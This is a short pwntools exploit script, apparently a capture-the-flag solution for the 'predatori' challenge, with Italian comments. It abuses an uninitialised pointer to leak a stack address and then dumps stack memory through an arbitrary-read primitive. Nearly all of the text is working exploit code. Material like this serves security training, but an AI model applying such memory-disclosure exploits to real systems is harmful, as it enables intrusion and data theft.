from pwn import *

context.binary = elf = ELF('./predatori')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('predatori.challs.olicyber.it', 15006)
else:
    r = gdb.debug('./predatori', ''' 
                   b rww   
                   c
                  ''')

# La variabile *addr in cui viene salvato l'indirizzo da leggere in rww non è inizializzata: punta ad un valore sullo stack. 
# Nell'indirizzo a cui punta addr viene salvato il nostro input, invio allora il minor numero di byte possibile per non modificare eccessivamente il contenuto (che è un indirizzo a sua volta), quindi un byte \x00.
# Il contenuto di addr viene poi dereferenziato a sua volta e stampato: se tutto va bene otteniamo un indirizzo dello stack e possiamo dumpare tutti i byte che troviamo.

r.recvuntil(b'Esci')
r.sendline(b'1')

r.recvuntil(b'Indirizzo: ')
r.send(b'\x00')

r.recvline()
r.recvline()

addr = r.recvuntil(b'1)')[:-2]
addr = u64(addr.ljust(8))
print(hex(addr))

for i in range(40):
    r.recvuntil(b'Esci')
    r.sendline(b'1')

    r.recvuntil(b'Indirizzo: ')
    r.send(p64(addr + i*8))
    r.recvuntil(b'...\n')
    print(r.recvuntil(b'1)')[:-2])

